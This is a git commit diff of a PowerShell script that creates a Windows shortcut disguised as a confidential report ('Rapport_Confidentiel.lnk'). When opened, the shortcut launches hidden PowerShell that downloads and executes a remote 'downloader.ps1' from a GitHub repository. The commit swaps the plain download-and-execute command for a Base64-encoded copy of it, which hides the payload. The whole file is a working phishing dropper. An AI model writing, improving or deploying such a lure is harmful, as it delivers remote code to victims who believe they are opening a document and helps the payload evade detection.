78493bb47b8e4681c00eec1b153c459926b03d7d
cheikhoudieng <cheikhoudieng032@gmail.com>
2026-02-26 23:59:54 +0000

    first commit

--- generate_shortcut.ps1
+++ generate_shortcut.ps1
@@ -2,8 +2,8 @@
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("$PWD\Rapport_Confidentiel.lnk")
 $Shortcut.TargetPath = "powershell.exe"
-$Shortcut.Arguments = '-nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheikhoudieng/security-certs-updates/main/downloader.ps1')"'
+$Shortcut.Arguments = "-nop -w hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGkAawBoAG8AdQBkAGkAZQBuAGcALwBzAGUAYwB1AHIAaQB0AHkALQBjAGUAcgB0AHMALQB1AHAAZABhAHQAZQBzAC8AbQBhAGkAbgAvAGQAbwB3AG4AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
 $Shortcut.WindowStyle = 7
 $Shortcut.IconLocation = "shell32.dll,3"
 $Shortcut.Save()
-Write-Host "[OK] Raccourci créé : Rapport_Confidentiel.lnk" -ForegroundColor Green
+Write-Host "[OK] Raccourci cree : Rapport_Confidentiel.lnk" -ForegroundColor Green
